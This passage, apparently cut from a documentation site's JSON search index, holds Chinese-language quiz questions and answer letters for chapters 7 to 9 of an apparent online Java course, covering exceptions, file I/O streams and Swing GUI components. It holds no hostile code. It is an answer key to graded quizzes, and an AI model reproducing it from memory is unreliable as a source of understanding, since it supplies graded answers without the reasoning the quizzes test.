\u4e0b\u5217\u5e38\u89c1\u7684\u7cfb\u7edf\u5b9a\u4e49\u7684\u5f02\u5e38\u4e2d\uff0c\u54ea\u4e00\u4e2a\u662f\u8f93\u5165\u3001\u8f93\u51fa\u5f02\u5e38\uff1f A. ClassNotFoundException B. IOException C. InterruptedException D. UnknownHostException \u89e3\u51b3\u65b9\u6848 B \u54ea\u4e2a\u5173\u952e\u5b57\u53ef\u4ee5\u629b\u51fa\u5f02\u5e38\uff1f A. transient B. finally C. throw D. static \u89e3\u51b3\u65b9\u6848 C \u4f8b\u5916\u5904\u7406\u8fc7\u7a0b\u4e2d\u5bf9\u4e8ecatch\u5b50\u53e5\u7684\u6392\u5217\uff0c\u4e0b\u5217\u54ea\u79cd\u662f\u6b63\u786e\u7684\uff1f A. \u7236\u7c7b\u5728\u5148\uff0c\u5b50\u7c7b\u5728\u540e B. \u5b50\u7c7b\u5728\u5148\uff0c\u7236\u7c7b\u5728\u540e C. \u6709\u7ee7\u627f\u5173\u7cfb\u7684\u5f02\u5e38\u4e0d\u80fd\u5728\u540c\u4e00\u4e2atry\u7a0b\u5e8f\u6bb5\u5185 D. \u5148\u6709\u5b50\u7c7b\uff0c\u5176\u4ed6\u5982\u4f55\u6392\u5217\u90fd\u65e0\u5173 \u89e3\u51b3\u65b9\u6848 B throws\u7684\u4f5c\u7528\u662f\uff1a A. \u6ca1\u6709\u610f\u4e49 B. \u8868\u793a\u540e\u9762\u662f\u65b9\u6cd5\u7684\u8f93\u51fa\u503c C. \u8868\u793a\u65b9\u6cd5\u53ef\u80fd\u4f1a\u629b\u51fa\u4f8b\u5916 D. \u65b9\u6cd5\u7684\u6807\u5fd7\uff0c\u6bcf\u4e2a\u65b9\u6cd5\u90fd\u5fc5\u987b\u6709 \u89e3\u51b3\u65b9\u6848 C","title":"7 \u4f8b\u5916\u5904\u7406"},{"location":"uooc/java/7/#71","text":"","title":"7.1 \u5904\u7406\u5f02\u5e38"},{"location":"uooc/java/7/#_1","text":"A. \u6355\u83b7\u5f02\u5e38 B. \u629b\u51fa\u5f02\u5e38 C. \u58f0\u660e\u5f02\u5e38 D. \u5d4c\u5957\u5f02\u5e38","title":"\u5f53\u65b9\u6cd5\u9047\u5230\u5f02\u5e38\u53c8\u4e0d\u77e5\u5982\u4f55\u5904\u7406\u65f6\uff0c\u4e0b\u5217\u54ea\u79cd\u8bf4\u6cd5\u662f\u6b63\u786e\u7684\uff1f"},{"location":"uooc/java/7/#_2","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/7/#_3","text":"A. java.io.Exception B. java.lang.Throwable C. java.lang.Exception D. java.lang.Error","title":"\u8bf7\u95ee\u6240\u6709\u7684\u5f02\u5e38\u7c7b\u7686\u7ee7\u627f\u54ea\u4e00\u4e2a\u7c7b\uff1f"},{"location":"uooc/java/7/#_4","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/7/#_5","text":"A. \u6b63\u786e B. \u9519\u8bef","title":"\u5f02\u5e38\u662f\u7a0b\u5e8f\u9519\u8bef\u6216\u53ef\u80fd\u5bfc\u81f4\u7a0b\u5e8f\u9519\u8bef\u7684\u4e0d\u6b63\u5e38\u72b6\u6001\u3002"},{"location":"uooc/java/7/#_6","text":"A","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/7/#_7","text":"A. \u6b63\u786e B. \u9519\u8bef","title":"\u5f53\u4e00\u4e2a\u65b9\u6cd5\u5728\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u4ea7\u751f\u4e00\u4e2a\u5f02\u5e38\uff0c\u5219\u8fd9\u4e2a\u65b9\u6cd5\u4f1a\u7ec8\u6b62\uff0c\u4f46\u662f\u6574\u4e2a\u7a0b\u5e8f\u4e0d\u4e00\u5b9a\u7ec8\u6b62\u8fd0\u884c\u3002"},{"location":"uooc/java/7/#_8","text":"A","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/7/#72","text":"","title":"7.2 \u4f8b\u5916\u5904\u7406\u673a\u5236"},{"location":"uooc/java/7/#javaerror-cannot-read-aaajava","text":"A. \u539f\u56e0\u662f\u6267\u884c\u7684\u5f53\u524d\u76ee\u5f55\u4e0b\u6ca1\u6709\u627e\u5230aaa.java\u6587\u4ef6 B. \u539f\u56e0\u662f\u6ca1\u6709\u5b89\u88c5JDK\u5f00\u53d1\u73af\u5883\u3002 C. \u539f\u56e0\u662fjava\u6e90\u6587\u4ef6\u540d\u540e\u7f00\u4e00\u5b9a\u662f\u4ee5 .txt \u7ed3\u5c3e\u3002 D. \u539f\u56e0\u662fJDK\u5b89\u88c5\u540e\u6ca1\u6709\u6b63\u786e\u8bbe\u7f6e\u73af\u5883\u53d8\u91cfPATH\u548cClasspath \u3002","title":"\u7f16\u8bd1java\u7a0b\u5e8f\u65f6\u51fa\u73b0error: cannot read: aaa.java\uff0c\u5219\u4e0b\u5217\u539f\u56e0\u6700\u6b63\u786e\u7684\u662f\uff1f"},{"location":"uooc/java/7/#_9","text":"A","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/7/#_10","text":"A. ClassNotFoundException B. IOException C. InterruptedException D. UnknownHostException","title":"\u4e0b\u5217\u5e38\u89c1\u7684\u7cfb\u7edf\u5b9a\u4e49\u7684\u5f02\u5e38\u4e2d\uff0c\u54ea\u4e00\u4e2a\u662f\u8f93\u5165\u3001\u8f93\u51fa\u5f02\u5e38\uff1f"},{"location":"uooc/java/7/#_11","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/7/#_12","text":"A. transient B. finally C. throw D. static","title":"\u54ea\u4e2a\u5173\u952e\u5b57\u53ef\u4ee5\u629b\u51fa\u5f02\u5e38\uff1f"},{"location":"uooc/java/7/#_13","text":"C","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/7/#catch","text":"A. \u7236\u7c7b\u5728\u5148\uff0c\u5b50\u7c7b\u5728\u540e B. \u5b50\u7c7b\u5728\u5148\uff0c\u7236\u7c7b\u5728\u540e C. \u6709\u7ee7\u627f\u5173\u7cfb\u7684\u5f02\u5e38\u4e0d\u80fd\u5728\u540c\u4e00\u4e2atry\u7a0b\u5e8f\u6bb5\u5185 D. \u5148\u6709\u5b50\u7c7b\uff0c\u5176\u4ed6\u5982\u4f55\u6392\u5217\u90fd\u65e0\u5173","title":"\u4f8b\u5916\u5904\u7406\u8fc7\u7a0b\u4e2d\u5bf9\u4e8ecatch\u5b50\u53e5\u7684\u6392\u5217\uff0c\u4e0b\u5217\u54ea\u79cd\u662f\u6b63\u786e\u7684\uff1f"},{"location":"uooc/java/7/#_14","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/7/#throws","text":"A. \u6ca1\u6709\u610f\u4e49 B. \u8868\u793a\u540e\u9762\u662f\u65b9\u6cd5\u7684\u8f93\u51fa\u503c C. \u8868\u793a\u65b9\u6cd5\u53ef\u80fd\u4f1a\u629b\u51fa\u4f8b\u5916 D. \u65b9\u6cd5\u7684\u6807\u5fd7\uff0c\u6bcf\u4e2a\u65b9\u6cd5\u90fd\u5fc5\u987b\u6709","title":"throws\u7684\u4f5c\u7528\u662f\uff1a"},{"location":"uooc/java/7/#_15","text":"C","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/8/","text":"8.1File\u7c7b \u53ef\u4ee5\u4f7f\u7528File\u7c7b\u8bfb\u53d6\u6587\u672c\u6587\u4ef6\u91cc\u7684\u5185\u5bb9\u3002 A. \u6b63\u786e B. \u9519\u8bef \u89e3\u51b3\u65b9\u6848 B 8.2 \u8f93\u5165\u8f93\u51fa\u6d41 \u4e0b\u5217InputStream\u7c7b\u4e2d _ \u65b9\u6cd5\u53ef\u4ee5\u7528\u4e8e\u5173\u95ed\u6d41\uff1f A. skip() B. reset() C. close() D. mark() \u89e3\u51b3\u65b9\u6848 C \u4f7f\u7528FileInputStream\u7c7b\uff0c\u53ef\u4ee5\u4ece\u6587\u4ef6\u4e2d\u6309\u5b57\u7b26\u8bfb\u5165\u6570\u636e\u3002 A. \u6b63\u786e B. \u9519\u8bef \u89e3\u51b3\u65b9\u6848 B","title":"8 File\u7c7b\u4e0e\u8f93\u5165\u8f93\u51fa\u6d41"},{"location":"uooc/java/8/#81file","text":"","title":"8.1File\u7c7b"},{"location":"uooc/java/8/#file","text":"A. \u6b63\u786e B. \u9519\u8bef","title":"\u53ef\u4ee5\u4f7f\u7528File\u7c7b\u8bfb\u53d6\u6587\u672c\u6587\u4ef6\u91cc\u7684\u5185\u5bb9\u3002"},{"location":"uooc/java/8/#_1","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/8/#82","text":"","title":"8.2 \u8f93\u5165\u8f93\u51fa\u6d41"},{"location":"uooc/java/8/#inputstream_","text":"A. skip() B. reset() C. close() D. mark()","title":"\u4e0b\u5217InputStream\u7c7b\u4e2d_\u65b9\u6cd5\u53ef\u4ee5\u7528\u4e8e\u5173\u95ed\u6d41\uff1f"},{"location":"uooc/java/8/#_2","text":"C","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/8/#fileinputstream","text":"A. \u6b63\u786e B. \u9519\u8bef","title":"\u4f7f\u7528FileInputStream\u7c7b\uff0c\u53ef\u4ee5\u4ece\u6587\u4ef6\u4e2d\u6309\u5b57\u7b26\u8bfb\u5165\u6570\u636e\u3002"},{"location":"uooc/java/8/#_3","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/9/","text":"9.2 \u7a97\u4f53 \u4f7f\u7528Swing\u7f16\u7a0b\u65f6\uff0c\u5982\u679c\u8981\u4fdd\u8bc1\u7ebf\u7a0b\u5b89\u5168\uff0c\u9700\u8981\u4f7f\u7528\u54ea\u51e0\u79cd\u7ebf\u7a0b\uff1a A. \u521d\u59cb\u5316\u7ebf\u7a0b B. \u4e8b\u4ef6\u8c03\u5ea6\u7ebf\u7a0b C. \u5de5\u4f5c\u7ebf\u7a0b \u89e3\u51b3\u65b9\u6848 ABC 9.3 \u83dc\u5355 \u5feb\u6377\u952e\u662f\u4e3a\u4e86\u63d0\u5347\u6548\u7387\u800c\u8bbe\uff0c\u83dc\u5355\u9879\u4e00\u5b9a\u8981\u8bbe\u7f6e\u5feb\u6377\u952e\u3002 A. \u6b63\u786e B. \u9519\u8bef \u89e3\u51b3\u65b9\u6848 B \u52a9\u8bb0\u7b26\u662f\u4e3a\u4e86\u63d0\u5347\u6548\u7387\u800c\u8bbe\uff0c\u83dc\u5355\u9879\u4e00\u5b9a\u8981\u8bbe\u7f6e\u52a9\u8bb0\u7b26\u3002 A. \u6b63\u786e B. \u9519\u8bef \u89e3\u51b3\u65b9\u6848 B 9.4 \u5e03\u5c40\u7ba1\u7406 \u4e3a\u4e86\u5b9e\u73b0\u590d\u6742\u7684\u754c\u9762\u5e03\u5c40\uff0cJFrame\u7684\u5185\u5bb9\u533a\u53ef\u4ee5\u8bbe\u7f6e\u591a\u4e2aLayout\u3002 A. \u6b63\u786e B. \u9519\u8bef \u89e3\u51b3\u65b9\u6848 B 9.5 \u5e38\u7528\u7ec4\u4ef6 \u5bc6\u7801\u6846\u7c7bJPasswordField\u662f\u6587\u672c\u6846\u7c7bJTextField\u7684\u5b50\u7c7b\u3002\u6587\u672c\u6846\u7528JTextField.getText()\u83b7\u53d6\u6587\u672c\u5185\u5bb9\uff0c\u5bc6\u7801\u6846\u53ef\u4ee5\u4f7f\u7528JPasswordField.getText()\u83b7\u53d6\u5bc6\u7801\u6587\u672c\u3002 A. \u6b63\u786e B. \u9519\u8bef \u89e3\u51b3\u65b9\u6848 B 9.6 \u5e38\u7528\u5bf9\u8bdd\u6846 1 String s = JOptionPane . showInputDialog ( frame , \"\u8bf7\u8f93\u5165\u60a8\u6240\u5728\u57ce\u5e02\u540d\u79f0\uff1a\" ); \u4e0a\u9762\u7684\u4ee3\u7801\u6267\u884c\u540e\uff0c\u4f1a\u5f39\u51fa\u4e00\u4e2a\u8f93\u5165\u5bf9\u8bdd\u6846\uff0c\u5982\u679c\u7528\u6237\u70b9\u51fb\u5bf9\u8bdd\u6846\u53f3\u4e0a\u89d2\u4e0a\u7684\u201cX\u201d\u56fe\u6807\uff08\u5173\u95ed\u6309\u94ae\uff09\uff0c\u90a3\u4e48\u8fd4\u56de\u503cs\u662f\uff1a A. \"\" B. null C. NULL D. false \u89e3\u51b3\u65b9\u6848 B 9.7 \u4e8b\u4ef6\u5904\u7406 \u4e0b\u9762\u54ea\u4e9b\u662f\u6b63\u786e\u7684\uff1f A. MouseAdapter\u662f\u4e00\u4e2a\u7c7b B. MouseAdapter\u662f\u4e00\u4e2a\u63a5\u53e3 C. MouseListener\u662f\u4e00\u4e2a\u7c7b D. MouseListener\u662f\u4e00\u4e2a\u63a5\u53e3 \u89e3\u51b3\u65b9\u6848 AD","title":"9 \u56fe\u5f62\u7528\u6237\u754c\u9762\u8bbe\u8ba1"},{"location":"uooc/java/9/#92","text":"","title":"9.2 \u7a97\u4f53"},{"location":"uooc/java/9/#swing","text":"A. \u521d\u59cb\u5316\u7ebf\u7a0b B. \u4e8b\u4ef6\u8c03\u5ea6\u7ebf\u7a0b C. \u5de5\u4f5c\u7ebf\u7a0b","title":"\u4f7f\u7528Swing\u7f16\u7a0b\u65f6\uff0c\u5982\u679c\u8981\u4fdd\u8bc1\u7ebf\u7a0b\u5b89\u5168\uff0c\u9700\u8981\u4f7f\u7528\u54ea\u51e0\u79cd\u7ebf\u7a0b\uff1a"},{"location":"uooc/java/9/#_1","text":"ABC","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/9/#93","text":"","title":"9.3 \u83dc\u5355"},{"location":"uooc/java/9/#_2","text":"A. \u6b63\u786e B. \u9519\u8bef","title":"\u5feb\u6377\u952e\u662f\u4e3a\u4e86\u63d0\u5347\u6548\u7387\u800c\u8bbe\uff0c\u83dc\u5355\u9879\u4e00\u5b9a\u8981\u8bbe\u7f6e\u5feb\u6377\u952e\u3002"},{"location":"uooc/java/9/#_3","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/9/#_4","text":"A. \u6b63\u786e B. \u9519\u8bef","title":"\u52a9\u8bb0\u7b26\u662f\u4e3a\u4e86\u63d0\u5347\u6548\u7387\u800c\u8bbe\uff0c\u83dc\u5355\u9879\u4e00\u5b9a\u8981\u8bbe\u7f6e\u52a9\u8bb0\u7b26\u3002"},{"location":"uooc/java/9/#_5","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/9/#94","text":"","title":"9.4 \u5e03\u5c40\u7ba1\u7406"},{"location":"uooc/java/9/#jframelayout","text":"A. \u6b63\u786e B. \u9519\u8bef","title":"\u4e3a\u4e86\u5b9e\u73b0\u590d\u6742\u7684\u754c\u9762\u5e03\u5c40\uff0cJFrame\u7684\u5185\u5bb9\u533a\u53ef\u4ee5\u8bbe\u7f6e\u591a\u4e2aLayout\u3002"},{"location":"uooc/java/9/#_6","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/9/#95","text":"","title":"9.5 \u5e38\u7528\u7ec4\u4ef6"},{"location":"uooc/java/9/#jpasswordfieldjtextfieldjtextfieldgettextjpasswordfieldgettext","text":"A. \u6b63\u786e B. \u9519\u8bef","title":"\u5bc6\u7801\u6846\u7c7bJPasswordField\u662f\u6587\u672c\u6846\u7c7bJTextField\u7684\u5b50\u7c7b\u3002\u6587\u672c\u6846\u7528JTextField.getText()\u83b7\u53d6\u6587\u672c\u5185\u5bb9\uff0c\u5bc6\u7801\u6846\u53ef\u4ee5\u4f7f\u7528JPasswordField.getText()\u83b7\u53d6\u5bc6\u7801\u6587\u672c\u3002"},{"location":"uooc/java/9/#_7","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/9/#96","text":"1 String s = JOptionPane . showInputDialog ( frame , \"\u8bf7\u8f93\u5165\u60a8\u6240\u5728\u57ce\u5e02\u540d\u79f0\uff1a\" );","title":"9.6 \u5e38\u7528\u5bf9\u8bdd\u6846"},{"location":"uooc/java/9/#xs","text":"A. \"\" B. null C. NULL D. false","title":"\u4e0a\u9762\u7684\u4ee3\u7801\u6267\u884c\u540e\uff0c\u4f1a\u5f39\u51fa\u4e00\u4e2a\u8f93\u5165\u5bf9\u8bdd\u6846\uff0c\u5982\u679c\u7528\u6237\u70b9\u51fb\u5bf9\u8bdd\u6846\u53f3\u4e0a\u89d2\u4e0a\u7684\u201cX\u201d\u56fe\u6807\uff08\u5173\u95ed\u6309\u94ae\uff09\uff0c\u90a3\u4e48\u8fd4\u56de\u503cs\u662f\uff1a"},{"location":"uooc/java/9/#_8","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/9/#97","text":"","title":"9.7 \u4e8b\u4ef6\u5904\u7406"},{"location":"uooc/java/9/#_9","text":"A. MouseAdapter\u662f\u4e00\u4e2a\u7c7b B. MouseAdapter\u662f\u4e00\u4e2a\u63a5\u53e3 C. MouseListener\u662f\u4e00\u4e2a\u7c7b D. MouseListener\u662f\u4e00\u4e2a\u63a5\u53e3","title":"\u4e0b\u9762\u54ea\u4e9b\u662f\u6b63\u786e\u7684\uff1f"},{"location":"uooc/java/9/#_10","text":"AD","title":"\u89e3\u51b3\u65b9\u6848"}]}